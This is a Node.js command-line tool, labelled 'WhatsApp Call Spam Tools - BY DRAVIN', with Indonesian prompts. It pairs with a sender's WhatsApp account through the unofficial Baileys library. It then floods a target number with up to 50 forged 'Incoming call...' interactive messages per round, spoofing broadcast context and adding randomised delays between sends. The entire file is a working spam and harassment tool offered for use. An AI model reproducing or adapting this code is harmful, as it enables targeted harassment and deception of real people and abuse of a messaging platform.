const { default: makeWASocket, useMultiFileAuthState, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default;
const readline = require("readline");
const pino = require("pino");

// Utility Functions
const sleep = (ms, variation = 0) => new Promise(resolve => {
    setTimeout(resolve, ms + (variation ? Math.floor(Math.random() * variation) : 0));
});

const EXIT_WORDS = ["exit", "keluar", "quit", "q"];

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        const val = ans.trim().toLowerCase();
        if (EXIT_WORDS.includes(val)) {
            console.log(chalk.red("\n[!] Keluar dari tools..."));
            rl.close();
            process.exit(0);
        }
        rl.close();
        resolve(ans);
    }));
};

const progressBar = async (text = "Menyiapkan koneksi", total = 15, delay = 150) => {
    for (let i = 0; i <= total; i++) {
        const filled = chalk.green("█".repeat(i));
        const empty = chalk.gray("░".repeat(total - i));
        const bar = filled + empty;
        process.stdout.write(`\r${chalk.yellow(`[⌛] ${text}:`)} ${bar}`);
        await sleep(delay);
    }
    process.stdout.write(chalk.green(" ✓\n"));
};

const animasiGaris = async (total = 54, delay = 50) => {
    const mid = Math.floor(total / 2);

    for (let i = 0; i <= mid; i++) {
        const kiri = chalk.green("═".repeat(i));
        const kanan = chalk.green("═".repeat(i));
        const tengah = chalk.gray(" ".repeat(total - i * 2));

        const baris = kiri + tengah + kanan;
        process.stdout.write(`\r${baris}`);
        await sleep(delay);
    }

    process.stdout.write("\n");
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    console.log(chalk.magenta("[⚙️] WhatsApp Call Spam Tools - BY DRAVIN"));
    await animasiGaris();
    console.log(chalk.green("• Gunakan dengan bijak, resiko ditanggung pengguna"));
    console.log(chalk.yellow("• Pastikan nomor sender call aktif dan valid"));
    console.log(chalk.yellow("💡 Tips ketik exit/quit/keluar/q untuk keluar dari tools"));
    await animasiGaris();
};

// WhatsApp Connection Handler
class WhatsAppConnection {
    constructor() {
        this.conn = null;
    }

    async initialize() {
        const { state, saveCreds } = await useMultiFileAuthState('./dravin_call_session');
        
        this.conn = makeWASocket({
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: state,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 30000,
            emitOwnEvents: true,
            fireInitQueries: true,
            browser: ["Ubuntu", "Chrome", "20.0.04"]
        });

        this.conn.ev.on('creds.update', saveCreds);
        
        // Connection event handling
        this.conn.ev.on('connection.update', (update) => {
            if (update.connection === 'close') {
                console.log(chalk.yellow("\n⚠️ Koneksi terputus, mencoba menghubungkan kembali..."));
                setTimeout(() => this.initialize(), 5000);
            }
        });

        return this.conn;
    }

    async requestPairingCode(phoneNumber) {
        try {
            if (!this.conn || this.conn.connection === 'close') {
                console.log(chalk.yellow("Menyiapkan ulang koneksi..."));
                await this.initialize();
            }

            const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
            console.log(chalk.yellow("\n📱 Mengirim permintaan kode pairing..."));

            const { timeout } = await this.conn.requestPairingCode(cleanNumber);
            
            console.log(chalk.green(`\n✅ Kode pairing dikirim ke ${phoneNumber}`));
            console.log(chalk.yellow(`⏳ Berlaku selama ${timeout} detik`));
            console.log(chalk.cyan("📲 Buka WhatsApp > Linked Devices > Link a Device"));
            
            return true;
        } catch (error) {
            console.log(chalk.red(`\n❌ Gagal meminta kode: ${error.message}`));
            if (error.message.includes('Connection Closed')) {
                console.log(chalk.yellow("ℹ️ Cek koneksi internet dan coba lagi"));
            }
            return false;
        }
    }

    async waitForConnection() {
        return new Promise((resolve) => {
            this.conn.ev.on('connection.update', (update) => {
                if (update.connection === 'open') {
                    resolve(true);
                }
            });
        });
    }
}

// Fake Call Implementation
async function sendFakeCall(conn, targetNumber) {
    try {
        const message = await generateWAMessageFromContent(targetNumber, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [targetNumber]
                        },
                        body: { text: "Incoming call..." },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    call_type: "voice",
                                    call_id: Math.random().toString(36).substring(7)
                                })
                            }]
                        }
                    }
                }
            }
        }, {});

        await conn.relayMessage(targetNumber, message.message, {
            messageId: message.key.id
        });
        return true;
    } catch (error) {
        console.error(chalk.red(`Error: ${error.message}`));
        return false;
    }
}

// Main Application Flow
async function main() {
    await showBanner();
    
    try {
        const whatsapp = new WhatsAppConnection();
        const conn = await whatsapp.initialize();

        // Sender Number Input
        let senderNumber = await question(
            chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' ├──╼') + chalk.yellow('Nomor Sender (62xxxxxx)') + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
        );

        if (!/^62\d{9,13}$/.test(senderNumber)) {
            console.log(chalk.red("\nFormat nomor salah! Contoh: 6281234567890"));
            process.exit(1);
        }

        // Pairing Process
        if (!await whatsapp.requestPairingCode(senderNumber)) {
            process.exit(1);
        }

        console.log(chalk.yellow("\n⏳ Menunggu verifikasi pairing..."));
        await whatsapp.waitForConnection();
        console.log(chalk.green("\n✅ Berhasil terhubung!"));

        // Main Spam Loop
        while (true) {
            const targetNumber = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow('Nomor Target (62xxxxxx)') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );

            if (!/^62\d{9,13}$/.test(targetNumber)) {
                console.log(chalk.red("\nFormat nomor salah!"));
                continue;
            }

            const jumlah = parseInt(await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow('Jumlah Spam (1-50)') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            ));

            if (isNaN(jumlah) || jumlah < 1 || jumlah > 50) {
                console.log(chalk.red("\nJumlah harus 1-50!"));
                continue;
            }

            console.log(chalk.green(`\n🚀 Mulai spam ke ${targetNumber} sebanyak ${jumlah}x`));
            
            let success = 0;
            for (let i = 0; i < jumlah; i++) {
                await progressBar(`Proses ${i+1}/${jumlah}`, 10, 100);
                
                if (await sendFakeCall(conn, targetNumber)) {
                    success++;
                    console.log(chalk.green(`[${i+1}] Berhasil`));
                } else {
                    console.log(chalk.red(`[${i+1}] Gagal`));
                }
                
                await sleep(Math.random() * 2000 + 1000);
            }

            console.log(chalk.cyan("\n📊 Hasil:"));
            console.log(chalk.cyan(`├─ Target: ${targetNumber}`));
            console.log(chalk.cyan(`├─ Total: ${jumlah}`));
            console.log(chalk.cyan(`├─ Berhasil: ${success}`));
            console.log(chalk.cyan(`└─ Gagal: ${jumlah - success}`));

            const again = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.magenta('Lanjutkan? (y/n)') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );

            if (again.toLowerCase() !== 'y') break;
        }

        console.log(chalk.green("\n✨ Selesai!"));
        process.exit(0);

    } catch (error) {
        console.error(chalk.red(`\n💀 Error: ${error.message}`));
        process.exit(1);
    }
}

// Start the application
main();
